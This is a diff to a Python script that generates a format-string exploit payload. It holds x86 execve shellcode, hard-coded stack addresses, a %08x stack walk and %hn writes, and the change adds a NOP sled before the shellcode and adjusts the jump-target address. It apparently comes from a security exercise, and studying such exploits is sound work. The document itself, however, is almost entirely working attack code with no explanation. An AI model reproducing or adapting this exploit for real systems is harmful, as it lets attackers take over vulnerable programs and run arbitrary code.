@@ -1,11 +1,11 @@
 import sys
 import os
-
+NOPSLED = b'\x90' * 0x300
 SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
 
 ADDRESSTOWRITE = b'BFFFE57C'
 i = 1
-ADDRESSOFSHELL = b'\xBF\xFF\xF4\x59'
+ADDRESSOFSHELL = b'\xBF\xFF\xF4\x80'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
@@ -31,4 +31,4 @@ ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
 LENTGHOFREQUIRED = 316
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' +  b'%hn' + SHELLCODE + b'\n')
+    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' +  b'%hn' + NOPSLED + SHELLCODE + b'\n')
